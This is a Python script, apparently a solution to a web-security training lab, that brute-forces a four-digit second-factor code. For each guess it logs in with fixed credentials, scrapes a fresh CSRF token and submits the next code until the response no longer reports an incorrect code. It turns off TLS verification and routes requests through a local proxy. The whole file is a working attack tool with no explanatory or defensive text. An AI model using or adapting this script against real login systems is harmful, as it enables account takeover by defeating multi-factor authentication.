import requests
from bs4 import BeautifulSoup
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8087", "https": "http://127.0.0.1:8087"}

def get_csrf_token(session, url):
    # Send an initial GET request to the login page
    response = session.get(url, proxies=proxies, verify=False)
    
    # Check if the request was successful
    if response.status_code != 200:
        print(f"Failed to retrieve the CSRF token. Status code: {response.status_code}")
        return None

    # Use BeautifulSoup to parse the response and find the CSRF token
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})

    if csrf_input:
        csrf_token = csrf_input.get('value')
        return csrf_token
    else:
        print("CSRF token not found in the HTML.")
        return None

def auth_exploit(url):
    session = requests.Session()
    mfa_code = ""
    for i in range(0, 10000, 2):
        # Get the CSRF token by visiting the login page
        csrf_token = get_csrf_token(session, url + "/login")
        data = {
            "csrf": csrf_token,
            "username": "carlos",
            "password": "montoya"
        }
        res = session.post(url + "/login", data=data, proxies=proxies, verify=False)

        mfa_code = str(i).zfill(4)
        csrf_token = get_csrf_token(session, url + "/login2")
        
        data = {"csrf": csrf_token, "mfa-code": mfa_code}
        res = session.post(url + "/login2", data=data, proxies=proxies, verify=False)

        if "Incorrect security code" not in res.text and res.status_code == 200:
            print("(+) Here is the mfa-code : " + mfa_code)
            break
        else:
            mfa_code = str(i + 1).zfill(4)
            csrf_token = get_csrf_token(session, url + "/login2")
            
            data = {"csrf": csrf_token, "mfa-code": mfa_code}
            res = session.post(url + "/login2", data=data, proxies=proxies, verify=False)
            if "Incorrect security code" not in res.text and res.status_code == 200:
                print("(+) Here is the mfa-code : " + mfa_code)
                break
            else:
                sys.stdout.write("\r"+mfa_code)
                sys.stdout.flush()

    return mfa_code

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    mfa_code = auth_exploit(url)
    print("Final mfa-code: " + mfa_code)